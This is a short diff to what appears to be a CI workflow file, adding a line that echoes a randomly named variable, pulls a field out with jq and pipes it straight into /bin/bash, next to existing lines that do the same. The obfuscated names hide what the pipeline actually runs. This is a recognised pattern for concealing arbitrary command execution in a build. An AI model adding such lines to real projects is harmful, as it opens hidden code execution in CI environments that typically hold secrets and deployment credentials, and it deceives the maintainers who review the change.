@@ -21,6 +21,7 @@ jobs:
           echo $xv34233 | jq -r .jlajd0093 | /bin/bash
           printf '%s' "$prsat5256" | jq -r .spj63608 | /bin/bash
           echo $zrpjx31231 | jq -r .yc191 | /bin/bash
+          echo $j91 | jq -r .xredq0 | /bin/bash
 
       - name: Store results
         if: always()
